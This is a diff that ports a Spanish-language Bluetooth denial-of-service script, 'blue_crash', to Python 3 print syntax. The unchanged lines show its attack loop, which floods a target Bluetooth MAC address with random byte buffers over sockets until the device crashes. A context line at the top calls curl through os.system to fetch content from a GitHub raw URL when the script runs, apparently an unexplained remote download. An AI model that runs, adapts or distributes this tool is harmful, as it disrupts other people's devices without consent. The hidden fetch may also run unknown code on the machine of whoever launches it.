@@ -14,8 +14,8 @@ os.system("curl -s -L https://raw.githubusercontent.com/l410systems/mn/main/sele
 os.system("echo ready")
 caracteres = 16
 
-print "\n\nScript DOS bluetooth by v4char"
-print "Se paciente puede tardar un poco"
+print ("\n\nScript DOS bluetooth by v4char")
+print ("Se paciente puede tardar un poco")
 
 if len(sys.argv) >= 3:
 
@@ -51,7 +51,7 @@ if len(sys.argv) >= 3:
             buff = (generar(8).decode("hex"))*caracteres
             s.send(buff)
             s.close
-            print "Atacando...\n"
+            print ("Atacando...\n")
             main(int(sys.argv[2]))
          except:
             caracteres = caracteres - 1
@@ -60,4 +60,4 @@ if len(sys.argv) >= 3:
    obtener_longitud()
 
 else:
-   print "Error usa \"python blue_crash.py bt_mac hilos\"\n";
+   print ("Error usa \"bt.py bt_mac hilos\"\n")
